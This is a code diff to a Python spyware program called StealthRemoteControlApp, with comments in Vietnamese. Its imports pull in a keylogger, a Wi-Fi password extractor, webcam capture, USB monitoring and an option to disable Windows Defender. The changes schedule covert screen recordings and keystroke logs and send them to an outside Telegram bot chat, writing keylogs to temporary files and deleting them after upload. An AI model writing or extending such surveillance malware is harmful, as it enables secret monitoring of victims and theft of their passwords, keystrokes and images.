@@ -62,12 +62,13 @@ from wifi_extractor import WiFiExtractor
 from webcam_capture import WebcamCapture
 from usb_monitor import USBMonitor
 from config import (
-    RECORD_DURATION_MIN, RECORD_DURATION_MAX, KEYLOG_ENABLED, AUTO_DELETE_VIDEO,
+    RECORD_DURATION, KEYLOG_ENABLED, AUTO_DELETE_VIDEO,
     TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, TEMP_DIR,
     OPTIMIZE_FOR_WEAK_PC, DISABLE_DEFENDER,
     WIFI_EXTRACTOR_ENABLED, WIFI_EXTRACT_INTERVAL,
     WEBCAM_CAPTURE_ENABLED, WEBCAM_CAPTURE_INTERVAL,
-    USB_MONITOR_ENABLED, USB_CHECK_INTERVAL
+    USB_MONITOR_ENABLED, USB_CHECK_INTERVAL,
+    VIDEO_SEND_INTERVAL, KEYLOG_SEND_INTERVAL
 )
 from datetime import datetime
 
@@ -104,6 +105,8 @@ class StealthRemoteControlApp:
         self.last_wifi_extract = 0
         self.last_webcam_capture = 0
         self.last_usb_check = 0
+        self.last_video_send = 0
+        self.last_keylog_send = 0
         
         # Tối ưu hiệu năng
         if OPTIMIZE_FOR_WEAK_PC:
@@ -234,8 +237,8 @@ class StealthRemoteControlApp:
     def record_and_send_with_keylog(self):
         """Quay màn hình, gửi video và keylog riêng biệt về Telegram"""
         try:
-            # Chọn thời gian quay ngẫu nhiên từ 10-20 giây
-            duration = random.randint(RECORD_DURATION_MIN, RECORD_DURATION_MAX)
+            # Quay cố định 20 giây
+            duration = RECORD_DURATION
             
             # Quay màn hình
             video_path = record_screen(duration=duration)
@@ -496,12 +499,38 @@ class StealthRemoteControlApp:
                             pass
                         self.last_usb_check = current_time
                 
-                # Quay và gửi video kèm keylog
-                self.record_and_send_with_keylog()
+                # Quay và gửi video kèm keylog định kỳ
+                if self.last_video_send == 0:
+                    self.last_video_send = current_time
+                if current_time - self.last_video_send >= VIDEO_SEND_INTERVAL:
+                    try:
+                        self.record_and_send_with_keylog()
+                        self.last_video_send = current_time
+                    except:
+                        pass
                 
-                # Đợi một chút trước lần quay tiếp theo
-                # Không cần đợi lâu vì đã quay 10-20s rồi
-                time.sleep(5)
+                # Gửi keylog riêng định kỳ (nếu có nhiều keylog)
+                if self.keylogger and KEYLOG_ENABLED:
+                    if self.last_keylog_send == 0:
+                        self.last_keylog_send = current_time
+                    if current_time - self.last_keylog_send >= KEYLOG_SEND_INTERVAL:
+                        try:
+                            keylog_content = self.keylogger.get_log_content()
+                            if keylog_content and len(keylog_content) > 1000:  # Chỉ gửi nếu có nhiều keylog
+                                keylog_file_path = os.path.join(TEMP_DIR, f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
+                                with open(keylog_file_path, 'w', encoding='utf-8') as f:
+                                    f.write(keylog_content)
+                                
+                                if self.telegram.bot:
+                                    caption = f"🖥️ Machine: {self.machine_short_id}\n⌨️ Keylog Update\n⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n📊 Lines: {len(keylog_content.split(chr(10)))}"
+                                    self.telegram.send_file_sync(keylog_file_path, caption=caption)
+                                    os.remove(keylog_file_path)
+                        except:
+                            pass
+                        self.last_keylog_send = current_time
+                
+                # Đợi một chút trước lần kiểm tra tiếp theo
+                time.sleep(10)  # Kiểm tra mỗi 10 giây
                 
         except KeyboardInterrupt:
             self.stop()
